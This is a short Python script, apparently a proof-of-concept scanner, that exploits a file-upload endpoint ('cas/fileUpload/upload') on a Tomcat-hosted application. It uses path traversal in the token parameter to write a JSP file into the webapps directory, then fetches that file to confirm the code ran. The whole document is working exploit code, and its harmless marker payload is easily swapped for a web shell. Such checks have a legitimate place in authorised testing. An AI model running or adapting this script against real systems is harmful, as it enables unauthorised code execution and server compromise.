import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
  import random
  key=random.randint(int(s),int(e))
  return key
r2=randomInt(10000, 99999)
def randomLowercase(n):
  key=""
  zf="qwertyuiopasdfghjklzxcvbnm"
  import random
  for _ in range(n):
    suiji1=random.randint(0,len(zf)-1)
    key+=zf[suiji1]
  return key
rand=randomLowercase(10)
def scan(baseurl):
  url = baseurl+ "cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/" + str(r2) + ".jsp&name=222"
  headers={
  "Content-range": "bytes 0-10/20",
  "Referer": baseurl+"cas/login"
  }
  body="<%out.print(\""+rand+"\");%>"
  response=requests.post(url,body,headers=headers,timeout=8,verify=False)
  if "\"success\\\":true" in response.text:
    r0=True
  else:
    r0=False
  url=baseurl+f"cas/js/lib/buttons/"+str(r2)+".jsp"
  response=requests.get(url,headers=headers,timeout=8,verify=False)
  if rand in response.text:
    r1=True
  else:
    r1=False
  if r0 and r1:
    return True
  else:
    return False

